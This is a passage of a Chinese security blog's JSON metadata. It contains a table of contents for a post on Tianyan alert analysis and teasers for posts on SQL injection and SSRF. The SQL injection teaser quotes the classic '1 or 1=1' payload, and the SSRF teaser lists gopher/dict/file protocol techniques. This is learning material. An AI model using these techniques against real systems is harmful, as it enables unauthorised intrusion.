href=\"#%E5%A4%A9%E7%9C%BC%E5%91%8A%E8%AD%A6%E7%9B%91%E6%B5%8B%E5%88%86%E6%9E%90-%E9%87%8D%E7%82%B92\"><span class=\"toc-text\">天眼告警监测分析(重点2)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%86%E7%B1%BB%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">分类目录</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">Web攻击</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5\"><span class=\"toc-text\">威胁情报</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%E5%B0%8F%E7%BB%93\"><span class=\"toc-text\">告警分析小结</span></a></li></ol></li></ol></li></ol>","author":{"name":"南瓜の无名","slug":"blog-author","avatar":"../picture/head_01.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"sql注入从零到一","uid":"36e7a6d4a5aae3b4367acd589247ef71","slug":"AA_sql注入从零到一","date":"2023-08-25T12:30:34.000Z","updated":"2024-04-19T01:35:09.784Z","comments":true,"path":"api/articles/AA_sql注入从零到一.json","keywords":null,"cover":"../picture/39.jpg","text":"sql注入从零到一 仅以此篇，回顾sql注入从零到一的时光。 这里只研究了mysql数据库。 联合注入(union)sql注入的起点(sqli-labs 1~4)根据报错信息判断闭合最开始学习sql注入的本质，其实就是1 or 1&#x3D;1 。 这里我们以sqli-labs第...","link":"","photos":[],"count_time":{"symbolsCount":"6.5k","symbolsTime":"6 mins."},"categories":[{"name":"知识体系","slug":"知识体系","count":2,"path":"api/categories/知识体系.json"}],"tags":[{"name":"sql注入","slug":"sql注入","count":1,"path":"api/tags/sql注入.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"../picture/head_01.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":false},"next_post":{"title":"知识体系_SSRF漏洞","uid":"bb6da0936a3f7d1937a29b9bd18cfd0e","slug":"AA_知识体系_SSRF漏洞","date":"2023-08-25T12:30:34.000Z","updated":"2024-04-07T10:06:01.385Z","comments":true,"path":"api/articles/AA_知识体系_SSRF漏洞.json","keywords":null,"cover":"../picture/36.jpg","text":"SSRF漏洞原理 实质，就是攻击者控制主机A对主机B发起攻击。 SSRF信息搜集-file伪协议 对内网ip段依次访问查询arp缓存表寻找存活主机。 SSRF信息搜集-Dict伪协议 SSRF信息搜集-http伪协议 gopher伪协议-SSRF基础利用 做两次url编码，SSR...","link":"","photos":[],"count_time":{"symbolsCount":751,"symbolsTime":"1 mins."},"categories":[{"name":"知识体系","slug":"知识体系","count":2,"path":"api/categories/知识体系.json"}],"tags":[{"name":"SSRF","slug":"SSRF","count":1,"path":"api/tags/SSRF.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"../picture/head_01.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":false}}